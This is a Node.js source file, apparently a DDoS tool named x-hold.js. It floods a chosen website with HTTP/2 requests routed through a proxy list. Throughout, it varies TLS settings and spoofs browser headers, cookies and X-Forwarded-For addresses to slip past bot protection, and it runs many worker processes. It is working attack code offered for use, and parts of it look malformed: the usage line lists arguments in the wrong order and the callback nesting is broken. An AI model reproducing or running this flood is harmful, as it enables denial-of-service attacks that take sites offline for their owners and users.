const fs = require('fs');
const tls = require('tls');
const http2 = require('http2');
const cluster = require('cluster');
const url = require('url');
const net = require('net');
const crypto = require('crypto');
const colors = require('colors');

const target = process.argv[2];
const duration = parseInt(process.argv[3]);
const threads = parseInt(process.argv[4]);
const rps = parseInt(process.argv[5]);
const proxyFile = process.argv[6];

 if (process.argv.length < 7){console.log(`Usage: node x-hold.js [host] [time] [proxyfile] [thread] [rps]`); process.exit();}

let proxies = fs.readFileSync(proxyFile, 'utf-8').toString().split('\n').filter(p => p.trim() !== '');
const parsedTarget = url.parse(target.includes('://') ? target : 'https://' + target);

let successRequests = 0;
let blockedRequests = 0;
let failedSockets = 0;

const acceptEncodings = ['gzip, deflate, br', 'gzip', 'br', 'identity'];

function randomUserAgent() {
    return [
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:112.0) Gecko/20100101 Firefox/112.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 Edg/112.0.1722.46",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.49 Safari/537.36 OPR/88.0.4412.40",
        "Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-G780F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/20.0 Chrome/112.0.5615.49 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.49 Mobile Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 14; Galaxy Z Flip5) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/123.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:2.0) Treco/20110515 Fireweb Navigator/2.4",
	"Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36",
	"Mozilla/5.0 (Linux; Android 14; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36",
	"Mozilla/5.0 (Linux; Android 14; SM-S721B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 14; SM-X920N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36",
	"Mozilla/5.0 (Linux; Android 14; SM-X826N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36",
	"Mozilla/5.0 (Linux; Android 14; SM-F956B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36",
	"Mozilla/5.0 (Linux; Android 14; SM-F741N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36",
	"Mozilla/5.0 (Linux; Android 14; SM-F958N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36",
	"Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36",
	"Mozilla/5.0 (Linux; Android 14; SM-A047F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36",
	"Mozilla/5.0 (Linux; Android 14; SM-A042M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36",
     	"Mozilla/5.0 (Linux; Android 14; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36",
	"Mozilla/5.0 (Linux; Android 14; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36",
	"Mozilla/5.0 (Linux; Android 14; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36",
	"Mozilla/5.0 (Linux; Android 14; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36",
	"Mozilla/5.0 (Linux; Android 14; LM-X420) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36",
	"Mozilla/5.0 (Linux; Android 14; LM-Q710(FGN)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36",
	"Mozilla/5.0 (Android 14; Mobile; rv:68.0) Gecko/68.0 Firefox/118.0",
	"Mozilla/5.0 (Android 14; Mobile; LG-M255; rv:118.0) Gecko/118.0 Firefox/118.0",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
     	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/118.0.5993.69 Mobile/15E148 Safari/604.1",
    	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/118.0 Mobile/15E148 Safari/605.1.15",
    	"Mozilla/5.0 (Linux; Android 10; HD1913) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36 EdgA/117.0.2045.53",
    	"Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36 EdgA/117.0.2045.53",
     	"Mozilla/5.0 (Linux; Android 10; Pixel 3 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36 EdgA/117.0.2045.53",
    	"Mozilla/5.0 (Linux; Android 10; ONEPLUS A6003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36 EdgA/117.0.2045.53",
    	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 EdgiOS/117.2045.65 Mobile/15E148 Safari/605.1.15"
    ][Math.floor(Math.random() * 42)];
}

function randomPath() {
    return (parsedTarget.path || '/') + `?vernitiger?=${crypto.randomBytes(6).toString('hex')}`;
}

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    return Array.from({ length }, () => characters.charAt(Math.floor(Math.random() * characters.length))).join('');
}

function randomCookie() {
    const sessionId = crypto.randomBytes(16).toString('hex');
    const csrfToken = crypto.randomBytes(12).toString('hex');
    return `session=${sessionId}; csrf_token=${csrfToken}; path=/; Secure; HttpOnly; SameSite=Lax`;
}

function randomAcceptEncoding() {
    return acceptEncodings[Math.floor(Math.random() * acceptEncodings.length)];
}

function randomCacheControl() {
    const values = ['no-cache', 'no-store', 'max-age=0', 'max-age=3600', 'private', 'public'];
    return values[Math.floor(Math.random() * values.length)];
}

function getRandomProxy() {
    const line = proxies[Math.floor(Math.random() * proxies.length)].trim();
    const parts = line.split(':');
    if (parts.length === 4) {
        return {
            host: parts[0],
            port: parts[1],
            auth: `${parts[2]}:${parts[3]}`
        };
    } else if (parts.length === 2) {
        return {
            host: parts[0],
            port: parts[1],
            auth: null
        };
    }
    return null;
}

const tlsOptionsList = [
  {
    ciphers: [
    'ECDHE-ECDSA-AES128-GCM-SHA256',
    'ECDHE-RSA-AES128-GCM-SHA256',
    'ECDHE-ECDSA-AES256-GCM-SHA384',
    'ECDHE-RSA-AES256-GCM-SHA384',
    'ECDHE-ECDSA-CHACHA20-POLY1305',
    'ECDHE-RSA-CHACHA20-POLY1305',
    'TLS_AES_128_GCM_SHA256',
    'TLS_AES_256_GCM_SHA384',
    'TLS_CHACHA20_POLY1305_SHA256',
    'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:TLS_AES_128_GCM_SHA256',
    'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384'
  ].join(':'),
    ecdhCurve: 'X25519:P-256:P-384:P-521',
    minVersion: 'TLSv1.3',
    maxVersion: 'TLSv1.3',
    secureOptions: crypto.constants.SSL_OP_NO_TLSv1 | crypto.constants.SSL_OP_NO_TLSv1_1,
  },
  {
    ecdhCurve: 'P-256:P-384:P-521',
    minVersion: 'TLSv1.2',
    maxVersion: 'TLSv1.3',
    ciphers: [
    'ECDHE-ECDSA-AES128-GCM-SHA256',
    'ECDHE-RSA-AES128-GCM-SHA256',
    'ECDHE-ECDSA-AES256-GCM-SHA384',
    'ECDHE-RSA-AES256-GCM-SHA384',
    'ECDHE-ECDSA-CHACHA20-POLY1305',
    'ECDHE-RSA-CHACHA20-POLY1305',
    'TLS_AES_128_GCM_SHA256',
    'TLS_AES_256_GCM_SHA384',
    'TLS_CHACHA20_POLY1305_SHA256',
    'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:TLS_AES_128_GCM_SHA256'
  ].join(':'),
    secureOptions: crypto.constants.SSL_OP_NO_TLSv1 | crypto.constants.SSL_OP_NO_TLSv1_1,
  }
];

function createSecureConnection(proxy, callback, failCallback) {
    if (!proxy || !proxy.host || isNaN(proxy.port)) return failCallback();

    const conn = net.connect(parseInt(proxy.port), proxy.host, () => {
        let connectRequest = `CONNECT ${parsedTarget.hostname}:443 HTTP/1.1\r\nHost: ${parsedTarget.hostname}\r\n`;
        if (proxy.auth) {
            const encodedAuth = Buffer.from(proxy.auth).toString('base64');
            connectRequest += `Proxy-Authorization: Basic ${encodedAuth}\r\n`;
        }
        connectRequest += `Connection: keep-alive\r\n\r\n`;
        conn.write(connectRequest);
    });

    conn.once('data', (chunk) => {
        if (!chunk.toString().includes('200')) {
            conn.destroy();
            return failCallback();
        }
        const tlsOptions = tlsOptionsList[Math.floor(Math.random() * tlsOptionsList.length)];

        const socket = tls.connect({
            socket: conn,
            servername: parsedTarget.hostname,
            ALPNProtocols: ['h2', 'http/1.1'],
            rejectUnauthorized: false,
            timeout: 300000,
            honorCipherOrder: true,
            ...tlsOptions
        }, () => callback(socket));

        socket.on('error', () => failCallback());
    });

    conn.on('error', failCallback);
    conn.on('timeout', failCallback);
}

function randomAcceptLanguage() {
    const langs = [
        'en-US,en;q=0.9',
        'en-GB,en;q=0.8,en-US;q=0.6',
        'en;q=0.7,fr;q=0.3',
        'en-US,en;q=0.5,es;q=0.3',
        'en-US,en;q=0.9,de;q=0.5'
    ];
    return langs[Math.floor(Math.random() * langs.length)];
}

function randomSecChUa() {
    const options = [
        `"Chromium";v="112", "Google Chrome";v="112", ";Not A Brand";v="99"`,
        `"Microsoft Edge";v="112", "Chromium";v="112", ";Not A Brand";v="99"`,
        `"Firefox";v="112", "Mozilla";v="112", ";Not A Brand";v="99"`,
        `"Opera";v="88", "Chromium";v="112", ";Not A Brand";v="99"`,
        `"Safari";v="16", "Apple WebKit";v="605", ";Not A Brand";v="99"`,
        `"SamsungBrowser";v="20", "Chromium";v="112", ";Not A Brand";v="99"`
    ];
    return options[Math.floor(Math.random() * options.length)];
}

function attack() {
    function start() {
        const proxy = getRandomProxy();
        if (!proxy) return setTimeout(start, 100);

        createSecureConnection(proxy, (socket) => {
            const client = http2.connect(parsedTarget.href, {
                createConnection: () => socket,
                settings: {
                    enablePush: false,
                    initialWindowSize: 16777215,
                    maxConcurrentStreams: 65535
                }
            });

            const fire = setInterval(() => {
                if (client.destroyed) {
                    clearInterval(fire);
                    start();
                    return;
                }

                const commonSecFetchSite = ['none', 'same-origin', 'same-site', 'cross-site'];
		const commonSecFetchMode = ['navigate', 'no-cors', 'cors', 'same-origin'];
		    
		    for (let i = 0; i < rps * 2; i++) {
			    try {
				    const req = client.request({
					    ':method': 'GET',
					    ':path': randomPath(),
					    ':scheme': 'https',
					    ':authority': parsedTarget.host,
					    'referer': Math.random() < 0.5 ? 'https://www.google.com/' : 'https://www.wikipedia.org/',
					    'user-agent': randomUserAgent(),
					    'accept-language': randomAcceptLanguage(),
					    'accept': '*/*',
					    'cookie': randomCookie(),
					    'accept-encoding': randomAcceptEncoding(),
					    'cache-control': randomCacheControl(),
					    'pragma': Math.random() < 0.5 ? 'cache' : 'no-cache',
					    'if-modified-since': new Date(Date.now() - Math.floor(Math.random() * 1e9)).toUTCString(),
					    'if-none-match': `"${Math.random().toString(36).substring(2, 10)}"`,
					    'expires': new Date(Date.now() + Math.floor(Math.random() * 86400000)).toUTCString(),
					    'x-forwarded-for': `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`,
					    'sec-ch-ua': randomSecChUa(),
					    'sec-ch-ua-mobile': Math.random() < 0.5 ? '?1' : '?0',
					    'sec-fetch-site': commonSecFetchSite[Math.floor(Math.random() * commonSecFetchSite.length)],
					    'sec-fetch-mode': commonSecFetchMode[Math.floor(Math.random() * commonSecFetchMode.length)],
					    'sec-fetch-user': '?1',
					    'sec-fetch-dest': 'document',
					    'upgrade-insecure-requests': '1',
				    });
				    
				    req.on('response', (headers) => {
					    if (headers[':status'] && headers[':status'] < 400) {
						    successRequests++;
					    } else {
						    blockedRequests++;
					    }
				    });
				    
				    req.on('error', () => { blockedRequests++; });
				    req.end();
			    } catch (e) {
				    client.destroy();
				    clearInterval(fire);
				    start();
			    }
		    }
		    
		    displayStats();
	    }, 100);
		
		setInterval(() => {
			if (!client.destroyed) {
				try { client.ping(Buffer.alloc(8, 0), () => {}); } catch (e) {}
			}
		}, 1000);
		
		client.on('error', () => {
			client.destroy();
			clearInterval(fire);
			start();
		});
		
		client.on('goaway', () => {
			client.destroy();
			clearInterval(fire);
			start();
		});
		
		client.on('close', () => {
			client.destroy();
			clearInterval(fire);
			start();
		});
		
		client.on('frameError', () => {
			client.destroy();
			clearInterval(fire);
			start();
		});
		
		client.on('streamError', () => {
			client.destroy();
			clearInterval(fire);
			start();
		});
	}, start);
    }
	
	start();
}

function displayStats() {
    process.stdout.write(`\r[+] Success: ${successRequests} | Blocked: ${blockedRequests} | Failed Sockets: ${failedSockets}`);
}

if (cluster.isMaster) {
    console.clear();
    console.log(colors.green(`[+] Starting ${threads} threads for ${duration}s`));

    for (let i = 0; i < threads; i++) {
        cluster.fork();
    }

    setTimeout(() => {
        console.log(colors.red('\n🔥 Attack Finished 🔥'));
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }
        setTimeout(() => process.exit(0), 1000);
    }, duration * 1000);

} else {
    const end = Date.now() + duration * 1000;

    const runner = setInterval(() => {
        if (Date.now() > end) {
            clearInterval(runner);
            process.exit(0);
        }
        attack();
    }, 10);

    process.on('SIGTERM', () => {
        clearInterval(runner);
        process.exit(0);
    });
}
